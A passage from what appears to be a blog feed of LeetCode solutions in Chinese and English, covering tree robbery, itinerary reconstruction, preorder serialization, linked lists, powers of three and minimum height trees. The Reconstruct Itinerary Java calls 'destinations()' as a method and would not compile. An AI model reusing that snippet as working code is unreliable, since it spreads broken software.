<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">Input: grid =</span><br><span class="line">[[0, 1, -1],</span><br><span class="line"> [1, 0, -1],</span><br><span class="line"> [1, 1,  1]]</span><br><span class="line">Output: 5</span><br><span class="line">Explanation: </span><br><span class="line">The player started at (0, 0) and went down, down, right right to reach (2, 2).</span><br><span class="line">4 cherries were picked up during this single trip, and the matrix becomes [[0,1,-1],[0,0,-1],[0,0,0]].</span><br><span class="line">Then, the player went left, up, up, left to return home, picking up one more cherry.</span><br><span class="line">The total number of cherries picked up is 5, and this is the maximum possible.</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ul>
<li><code>grid</code> is an <code>N</code> by <code>N</code> 2D array, with <code>1 &lt;= N &lt;= 50</code>.</li>
<li>Each grid[i][j] is an integer in the set {-1, 0, 1}.</li>
<li>It is guaranteed that grid[0][0] and grid[N-1][N-1] are not -1.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Dynamic Programming </tag>
            
            <tag> Leetcode </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[337. House Robber III]]></title>
      <url>/wiki/2017/10/30/Leetcode-337-House-Robber-III/</url>
      <content type="html"><![CDATA[<p>The thief has found himself a new place for his thievery again. There is only one entrance to this area, called the “root.” Besides the root, each house has one and only one parent house. After a tour, the smart thief realized that “all houses in this place forms a binary tree”. It will automatically contact the police if two directly-linked houses were broken into on the same night.</p>
<p>Determine the maximum amount of money the thief can rob tonight without alerting the police.</p>
<p>Example 1:</p>
<pre><strong>Input: </strong>[3,2,3,null,3,null,1]

     <font color="red">3</font>
    / \
   2   3
    \   \ 
     <font color="red">3   1
</font>
<strong>Output:</strong> 7 
<strong>Explanation:</strong>&nbsp;Maximum amount of money the thief can rob = <font color="red" style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;">3</font><span style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;"> + </span><font color="red" style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;">3</font><span style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;"> + </span><font color="red" style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;">1</font><span style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;"> = </span><b style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;">7</b><span style="font-family: sans-serif, Arial, Verdana, &quot;Trebuchet MS&quot;;">.</span></pre>



<p>Example 2:</p>
<pre><strong>Input: </strong>[3,4,5,1,3,null,1]

&nbsp;    3
    / \
   <font color="red">4</font>   <font color="red">5</font>
  / \   \ 
 1   3   1

<strong>Output:</strong> 9
<strong>Explanation:</strong>&nbsp;Maximum amount of money the thief can rob = <font color="red">4</font> + <font color="red">5</font> = <b>9</b>.
</pre>

<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Tree </tag>
            
            <tag> Depth-first Search </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[332. Reconstruct Itinerary]]></title>
      <url>/wiki/2017/10/30/Leetcode-332-Reconstruct-Itinerary/</url>
      <content type="html"><![CDATA[<p>Given a list of airline tickets represented by pairs of departure and arrival airports <code>[from, to]</code>, reconstruct the itinerary in order. All of the tickets belong to a man who departs from JFK. Thus, the itinerary must begin with JFK.</p>
<p>Note:</p>
<ol>
<li>If there are multiple valid itineraries, you should return the itinerary that has the smallest lexical order when read as a single string. For example, the itinerary <code>[&quot;JFK&quot;, &quot;LGA&quot;]</code> has a smaller lexical order than <code>[&quot;JFK&quot;, &quot;LGB&quot;]</code>.</li>
<li>All airports are represented by three capital letters (IATA code).</li>
<li>You may assume all tickets form at least one valid itinerary.</li>
</ol>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: [[&quot;MUC&quot;, &quot;LHR&quot;], [&quot;JFK&quot;, &quot;MUC&quot;], [&quot;SFO&quot;, &quot;SJC&quot;], [&quot;LHR&quot;, &quot;SFO&quot;]]</span><br><span class="line">Output: [&quot;JFK&quot;, &quot;MUC&quot;, &quot;LHR&quot;, &quot;SFO&quot;, &quot;SJC&quot;]</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Input: [[&quot;JFK&quot;,&quot;SFO&quot;],[&quot;JFK&quot;,&quot;ATL&quot;],[&quot;SFO&quot;,&quot;ATL&quot;],[&quot;ATL&quot;,&quot;JFK&quot;],[&quot;ATL&quot;,&quot;SFO&quot;]]</span><br><span class="line">Output: [&quot;JFK&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;SFO&quot;]</span><br><span class="line">Explanation: Another possible reconstruction is [&quot;JFK&quot;,&quot;SFO&quot;,&quot;ATL&quot;,&quot;JFK&quot;,&quot;ATL&quot;,&quot;SFO&quot;].</span><br><span class="line">             But it is larger in lexical order.</span><br></pre></td></tr></table></figure>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目寻找访问所有有向图的边的路径，并且路径的词典序(lexical order)为最小。通过图（有向图或无向图）中的所有边且每一条边仅通过一次的路径称为欧拉路径。那么这道题目其实就是寻找欧拉路径。</p>
<p>其实不知道欧拉路径以及它的算法，这道题目也是可以解决的。由于是图的遍历问题，很容易想到dfs，或者回溯法。具体做法为：创建一个图，将图中的目的地按照字母顺序排序，依次访问每一个目的地，记录下访问的目的地，检查是否使用完所有飞机票；如果没有，则改变行程，尝试另一张飞机票。一直尝试，直到用完所有飞机票。</p>
<p>关键点在于：由于要求访问的词典序最小，所以首先访问词典序最小的目的地，如果不成功，再尝试词典序大一些的。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> List&lt;String&gt; <span class="title">findItinerary</span><span class="params">(String[][] tickets)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">int</span> n = tickets.length;</span><br><span class="line">    LinkedList&lt;String&gt; visitOrder = <span class="keyword">new</span> LinkedList&lt;&gt;();</span><br><span class="line">    Map&lt;String, LinkedList&lt;String&gt;&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">    <span class="keyword">for</span> (String[] ticket : tickets) &#123;</span><br><span class="line">        map.putIfAbsent(ticket[<span class="number">0</span>], <span class="keyword">new</span> LinkedList&lt;&gt;());</span><br><span class="line">        map.get(ticket[<span class="number">0</span>]).add(ticket[<span class="number">1</span>]);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">for</span> (String v : map.keySet())</span><br><span class="line">        Collections.sort(map.get(v));</span><br><span class="line"></span><br><span class="line">    visitOrder.addFirst(<span class="string">"JFK"</span>);</span><br><span class="line">    findItinerary(visitOrder, map, <span class="string">"JFK"</span>, n);</span><br><span class="line">    <span class="keyword">return</span> visitOrder;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">boolean</span> <span class="title">findItinerary</span><span class="params">(LinkedList&lt;String&gt; visitOrder, Map&lt;String,    </span></span></span><br><span class="line"><span class="function"><span class="params">                    LinkedList&lt;String&gt;&gt; map, String v, <span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// base case</span></span><br><span class="line">    <span class="keyword">if</span> (visitOrder.size() == n + <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    LinkedList&lt;String&gt; destinations = map.get(v);</span><br><span class="line">    <span class="comment">// special case: v is invalid or v has no destinations</span></span><br><span class="line">    <span class="keyword">if</span> (destinations == <span class="keyword">null</span> || destinations() == <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="comment">// iterate</span></span><br><span class="line">    <span class="keyword">int</span> size = destinations();</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++) &#123;</span><br><span class="line">        String w = destinations.remove(i);</span><br><span class="line">        visitOrder.addLast(w);</span><br><span class="line">        <span class="keyword">if</span> (findItinerary(visitOrder, map, w, n)) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">        visitOrder.removeLast();</span><br><span class="line">        destinations.add(i, w);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对于欧拉路径，有专门的算法<a href="https://en.wikipedia.org/wiki/Eulerian_path#Hierholzer.27s_algorithm">Hierholzer’s algorithm</a>来寻找欧拉路径。</p>
<p>Hierholzer’s 1873 paper provides a different method for finding Euler cycles that is more efficient than Fleury’s algorithm:</p>
<ul>
<li>Choose any starting vertex $v$, and follow a trail of edges from that vertex until returning to $v$. It is not possible to get stuck at any vertex other than $v$, because the even degree of all vertices ensures that, when the trail enters another vertex $w$ there must be an unused edge leaving $w$. The tour formed in this way is a closed tour, but may not cover all the vertices and edges of the initial graph.</li>
<li>As long as there exists a vertex $u$ that belongs to the current tour but that has adjacent edges not part of the tour, start another trail from $u$, following unused edges until returning to $u$, and join the tour formed in this way to the previous tour.</li>
</ul>
<p><img src="http://phpk72ttq.bkt.clouddn.com/15430801446319.png?imageslim" alt=""></p>
<p>首先从起点JFK出发，dfs找到一个sub-path: JFK-&gt;A-&gt;C-&gt;D-&gt;A，在A处出现dead end(不再有可以走的边)，此时将A加到解当中，dfs返回。对于返回到的节点D，还有可以继续走的subpath，dfs继续找，得：D-&gt;B-&gt;C-&gt;JFK-&gt;D。此时的D为dead end，说明可以将D加到解当中，而且处于已经加过的点之前。以此类推，每次都加dead end的节点。直到所有点都是dead end！</p>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Depth-first Search </tag>
            
            <tag> Graph </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[331. Verify Preorder Serialization of a Binary Tree]]></title>
      <url>/wiki/2017/10/30/Leetcode-331-Verity-Preorder-Serialization-of-a-Binary-Tree/</url>
      <content type="html"><![CDATA[<p>One way to serialize a binary tree is to use pre-order traversal. When we encounter a non-null node, we record the node’s value. If it is a null node, we record using a sentinel value such as <code>#</code>.</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">     _9_</span><br><span class="line">    /   \</span><br><span class="line">   3     2</span><br><span class="line">  / \   / \</span><br><span class="line"> 4   1  #  6</span><br><span class="line">/ \ / \   / \</span><br><span class="line"># # # #   # #</span><br></pre></td></tr></table></figure>
<p>For example, the above binary tree can be serialized to the string <code>&quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;</code>, where <code>#</code> represents a null node.</p>
<p>Given a string of comma separated values, verify whether it is a correct preorder traversal serialization of a binary tree. Find an algorithm without reconstructing the tree.</p>
<p>Each comma separated value in the string must be either an integer or a character<code>&#39;#&#39;</code> representing null pointer.</p>
<p>You may assume that the input format is always valid, for example it could never contain two consecutive commas such as <code>&quot;1,,3&quot;</code>.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;9,3,4,#,#,1,#,#,2,#,6,#,#&quot;</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;1,#&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: &quot;9,#,#,1&quot;</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<h4 id="Solution-1"><a href="#Solution-1" class="headerlink" title="Solution 1"></a>Solution 1</h4><p>Some used stack. Some used the depth of a stack. Here I use a different perspective. In a binary tree, if we consider null as leaves, then</p>
<ul>
<li>all non-null node provides 2 outdegree and 1 indegree (2 children and 1 parent), except root</li>
<li>all null node provides 0 outdegree and 1 indegree (0 child and 1 parent).</li>
</ul>
<p>Suppose we try to build this tree. During building, we record the difference between out degree and in degree <code>diff</code> = <code>outdegree - indegree</code>. When the next node comes, we then decrease <code>diff</code> by 1, because the node provides an in degree. If the node is not null, we increase <code>diff</code> by 2, because it provides two out degrees. If a serialization is correct, <code>diff</code> should never be negative and <code>diff</code> will be zero when finished.</p>
<p>为什么开始为1呢？其实可以这么理解，在根结点上加一个虚拟的根节点。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidSerialization</span><span class="params">(String preorder)</span> </span>&#123;</span><br><span class="line">    String[] nodes = preorder.split(<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">int</span> diff = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">for</span> (String node: nodes) &#123;</span><br><span class="line">        <span class="keyword">if</span> (--diff &lt; <span class="number">0</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        <span class="keyword">if</span> (!node.equals(<span class="string">"#"</span>)) diff += <span class="number">2</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> diff == <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="Solution2"><a href="#Solution2" class="headerlink" title="Solution2"></a>Solution2</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"> <span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isValidSerialization</span><span class="params">(String preorder)</span> </span>&#123;</span><br><span class="line">    <span class="comment">// using a stack, scan left to right</span></span><br><span class="line">    <span class="comment">// case 1: we see a number, just push it to the stack</span></span><br><span class="line">    <span class="comment">// case 2: we see #, check if the top of stack is also #</span></span><br><span class="line">    <span class="comment">// if so, pop #, pop the number in a while loop, until top of stack is not #</span></span><br><span class="line">    <span class="comment">// if not, push it to stack</span></span><br><span class="line">    <span class="comment">// in the end, check if stack size is 1, and stack top is #</span></span><br><span class="line">    <span class="keyword">if</span> (preorder == <span class="keyword">null</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    Stack&lt;String&gt; st = <span class="keyword">new</span> Stack&lt;&gt;();</span><br><span class="line">    String[] strs = preorder.split(<span class="string">","</span>);</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> pos = <span class="number">0</span>; pos &lt; strs.length; pos++) &#123;</span><br><span class="line">        String curr = strs[pos];</span><br><span class="line">        <span class="keyword">while</span> (curr.equals(<span class="string">"#"</span>) &amp;&amp; !st.isEmpty() &amp;&amp; st.peek().equals(curr)) &#123;</span><br><span class="line">            st.pop();</span><br><span class="line">            <span class="keyword">if</span> (st.isEmpty()) &#123;</span><br><span class="line">                <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">            &#125;</span><br><span class="line">            st.pop();</span><br><span class="line">        &#125;</span><br><span class="line">        st.push(curr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> st.size() == <span class="number">1</span> &amp;&amp; st.peek().equals(<span class="string">"#"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Stack </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[328. Odd Even Linked List]]></title>
      <url>/wiki/2017/10/30/Leetcode-328-Odd-Even-Linked-List/</url>
      <content type="html"><![CDATA[<p>Given a singly linked list, group all odd nodes together followed by the even nodes. Please note here we are talking about the node number and not the value in the nodes.</p>
<p>You should try to do it in place. The program should run in $O(1)$ space complexity and $O(\text{nodes})$ time complexity.</p>
<p><strong>Example 1</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 1-&gt;2-&gt;3-&gt;4-&gt;5-&gt;NULL</span><br><span class="line">Output: 1-&gt;3-&gt;5-&gt;2-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure>
<p><strong>Example 2</strong>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 2-&gt;1-&gt;3-&gt;5-&gt;6-&gt;4-&gt;7-&gt;NULL</span><br><span class="line">Output: 2-&gt;3-&gt;6-&gt;7-&gt;1-&gt;5-&gt;4-&gt;NULL</span><br></pre></td></tr></table></figure>
<p><strong>Note</strong>:</p>
<ul>
<li>The relative order inside both the even and odd groups should remain as it was in the input.</li>
<li>The first node is considered odd, the second node even and so on …</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最直接的办法：一个odd链表保存奇数节点，一个even链表保存偶数节点。最后将odd链表的尾部只想even链表的首部，并将even链表的尾部指向null。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> ListNode <span class="title">oddEvenList</span><span class="params">(ListNode head)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (head == <span class="keyword">null</span> || head.next == <span class="keyword">null</span>) <span class="keyword">return</span> head;</span><br><span class="line">    ListNode odd = head, even = head.next, cur = even.next;</span><br><span class="line">    ListNode evenHead = even;</span><br><span class="line">    <span class="comment">// 一个odd链表保存奇数节点，一个even链表保存偶数节点</span></span><br><span class="line">    <span class="keyword">while</span> (cur != <span class="keyword">null</span> &amp;&amp; cur.next != <span class="keyword">null</span>) &#123;</span><br><span class="line">        odd.next = cur;</span><br><span class="line">        even.next = cur.next;</span><br><span class="line">        <span class="comment">// move to next </span></span><br><span class="line">        odd = odd.next;</span><br><span class="line">        even = even.next;</span><br><span class="line">        cur = cur.next.next;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// odd链表的尾部只想even链表的首部，并将even链表的尾部指向null。</span></span><br><span class="line">    <span class="keyword">if</span> (cur == <span class="keyword">null</span>) &#123;</span><br><span class="line">        odd.next = evenHead;</span><br><span class="line">        even.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//还有一个odd节点</span></span><br><span class="line">        odd.next = cur;</span><br><span class="line">        odd.next.next = evenHead;</span><br><span class="line">        even.next = <span class="keyword">null</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> head;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Linked List </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[326. Power of Three]]></title>
      <url>/wiki/2017/10/30/Leetcode-326-Power-of-Three/</url>
      <content type="html"><![CDATA[<p>Given an integer, write a function to determine if it is a power of three.</p>
<p>Example 1:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 27</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 2:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 0</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Example 3:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 9</span><br><span class="line">Output: true</span><br></pre></td></tr></table></figure>
<p>Example 4:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">Input: 45</span><br><span class="line">Output: false</span><br></pre></td></tr></table></figure>
<p>Follow up:<br>Could you do it without using any loop / recursion?</p>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>最直接的办法，一定就是一直除以3，直到1为止，看它是否等于1。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    <span class="keyword">double</span> nn = (<span class="keyword">double</span>)n;</span><br><span class="line">    <span class="keyword">while</span> (nn &gt; <span class="number">1</span> &amp;&amp; nn != <span class="number">1</span>)</span><br><span class="line">        nn /= <span class="number">3</span>;</span><br><span class="line">    <span class="keyword">if</span> (nn == <span class="number">1.0</span>) <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>更优的解决方案</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">boolean</span> <span class="title">isPowerOfThree</span><span class="params">(<span class="keyword">int</span> n)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (n &lt; <span class="number">1</span>) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (n % <span class="number">3</span> == <span class="number">0</span>) &#123;</span><br><span class="line">        n /= <span class="number">3</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> n == <span class="number">1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
        <categories>
            
            <category> Leetcode </category>
            
        </categories>
        
        
        <tags>
            
            <tag> Leetcode </tag>
            
            <tag> Math </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[310. Minimum Height Trees]]></title>
      <url>/wiki/2017/10/30/Leetcode-310-Minimum-Height-Trees/</url>
      <content type="html"><![CDATA[<p>For an undirected graph with tree characteristics, we can choose any node as the root. The result graph is then a rooted tree. Among all possible rooted trees, those with minimum height are called <em>minimum height trees</em> (MHTs). Given such a graph, write a function to find all the MHTs and return a list of their root labels.</p>
<p><strong>Format</strong></p>
<p>The graph contains $n$ nodes which are labeled from 0 to $n - 1$. You will be given the number $n$ and a list of undirected edges (each edge is a pair of labels).</p>
<p>You can assume that no duplicate edges will appear in edges. Since all edges are undirected, [0, 1] is the same as [1, 0] and thus will not appear together in edges.</p>
<p>Example 1 :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 4, edges = [[1, 0], [1, 2], [1, 3]]</span><br><span class="line"></span><br><span class="line">        0</span><br><span class="line">        |</span><br><span class="line">        1</span><br><span class="line">       / \</span><br><span class="line">      2   3 </span><br><span class="line"></span><br><span class="line">Output: [1]</span><br></pre></td></tr></table></figure>
<p>Example 2 :</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Input: n = 6, edges = [[0, 3], [1, 3], [2, 3], [4, 3], [5, 4]]</span><br><span class="line"></span><br><span class="line">     0  1  2</span><br><span class="line">      \ | /</span><br><span class="line">        3</span><br><span class="line">        |</span><br><span class="line">        4</span><br><span class="line">        |</span><br><span class="line">        5 </span><br><span class="line"></span><br><span class="line">Output: [3, 4]</span><br></pre></td></tr></table></figure>
<p>Note:</p>
<ul>
<li>According to the <a href="https://en.wikipedia.org/wiki/Tree_(graph_theory)">definition of tree on Wikipedia</a>: “a tree is an undirected graph in which any two vertices are connected by exactly one path. In other words, any connected graph without simple cycles is a tree.”</li>
<li>The height of a rooted tree is the number of edges on the longest downward path between the root and a leaf.</li>
</ul>
<h4 id="Java"><a href="#Java" class="headerlink" title="Java"></a>Java</h4><p>这道题目有两类解法。第一种方法是，观察得到以树中的最长路径的中点为根构建的树的高度是最小的。那么问题就变成如何寻找树中的最长路径(longest path of a tree)。其中一种简便的方法就是，使用两次bfs，第一次bfs以任意点出发$p_0$，寻找到最远的点$v$，第二次bfs以寻找到的最远点$v$出发，寻找到距离该点距离最远的点$w$。路径$v-w$就是树中的最长路径。可以简单证明如下：第一次bfs寻找到的点一定为最长路径的一个端点，利用反证法，如果存在另一点$p$为第一次bfs的最远点，那么$|p-p_0| &gt; |v-w|$，显然与最长路径定义矛盾。既然第一次bfs寻找到了最长路径一个端点，第二次bfs就肯定是另一个端点。</p>
